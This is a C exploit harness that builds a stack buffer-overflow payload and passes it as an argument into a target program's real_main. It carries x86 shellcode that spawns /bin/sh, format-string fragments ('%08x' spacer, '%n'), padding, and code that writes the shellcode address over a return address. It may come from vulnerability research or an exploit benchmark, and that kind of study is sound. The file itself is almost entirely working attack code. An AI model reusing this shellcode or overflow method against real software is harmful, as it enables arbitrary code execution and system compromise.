
#include "stdio.h"
#include "stdlib.h"
#include "string.h"

#define DEBUG 1
#define FORMATBUFFERSIZE 2048

union
{
    unsigned long int integer;
    unsigned char byte[4];
} intUnion;

union
{
    unsigned short int shortinteger;
    unsigned char byte[2];
} shortUnion;

char shellcode[] = \
"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0a\x04\x01\xcd\x80\x90";//this shellcode has x3 NOPs for padding, length=28

char spacer[] = \
"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.";//This spacer was altered from what is present in the complete version of the exploit

char writer[] = "%n";

extern int real_main(int argc, char **argv);

int main(int argc, char **argv) {

	char taintedbuf[8192] __attribute__ ((aligned (8)));
	int taintedbufWritePtr, taintedbufWriteCnt, diff;
	unsigned long int shellcodeaddr, retfptraddr;

	if (argc==3) {
		sscanf(argv[1], "%lx", &shellcodeaddr);
		sscanf(argv[2], "%lx", &retfptraddr);
	} else {
		printf("Wrong arguments..");
		return -1;
	}

	printf("shellcodeaddr=0x%lx, retfptraddr=0x%lx\n",shellcodeaddr, retfptraddr);
	memset(taintedbuf,0,sizeof(taintedbuf));
	taintedbufWritePtr=0;
	taintedbufWriteCnt=0;


	 /* Buffer Overflow exploit */
	strcpy(taintedbuf, shellcode);

	diff = retfptraddr - shellcodeaddr - strlen(taintedbuf);
	int i;
	char padding[50000];
	for(i = 0; i < diff; i++) {
		padding[i] = '-';
	}
	padding[i] = '\0';
	strcat(taintedbuf, padding);
	taintedbufWritePtr = strlen(taintedbuf);

	intUnion.integer = shellcodeaddr;
	taintedbuf[taintedbufWritePtr+3]=intUnion.byte[3];
	taintedbuf[taintedbufWritePtr+2]=intUnion.byte[2];
	taintedbuf[taintedbufWritePtr+1]=intUnion.byte[1];
	taintedbuf[taintedbufWritePtr]=intUnion.byte[0];
	taintedbufWritePtr+=4;

	taintedbuf[taintedbufWritePtr] = '\0';


	/* Common trigger code
	 */
	printf("%s\n", taintedbuf);

	strcpy(argv[1], "-a");
	argv[2] = taintedbuf;
	argc = 3;
	int ret;
	ret = real_main(argc, argv);

	return ret;
}
